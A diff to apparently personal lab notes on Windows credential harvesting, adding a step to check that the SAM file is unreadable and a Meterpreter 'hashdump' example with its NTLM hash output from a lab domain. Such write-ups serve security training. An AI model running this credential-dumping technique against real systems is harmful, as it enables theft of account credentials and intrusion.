@@ -65,6 +65,19 @@ In general, Windows operating system provides two types of user accounts: Local 
 ### Security Account Manager (SAM)
 The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database. 
 
+First, ensure you have deployed the provided VM and then confirm we are not able to copy or read  the c:\Windows\System32\config\sam file:
+<img width="715" height="197" alt="Screenshot 2026-05-20 220610" src="https://github.com/user-attachments/assets/5740434d-f3cd-4470-a028-e14411f2dbf8" />
+
 ### Metasploit's Hash Dump
+The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes.
+
+meterpreter > getuid
+Server username: THM\Administrator
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
+CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
+
 ### Volume Shadow Copy Service (VSS)
 ### Registry Hives
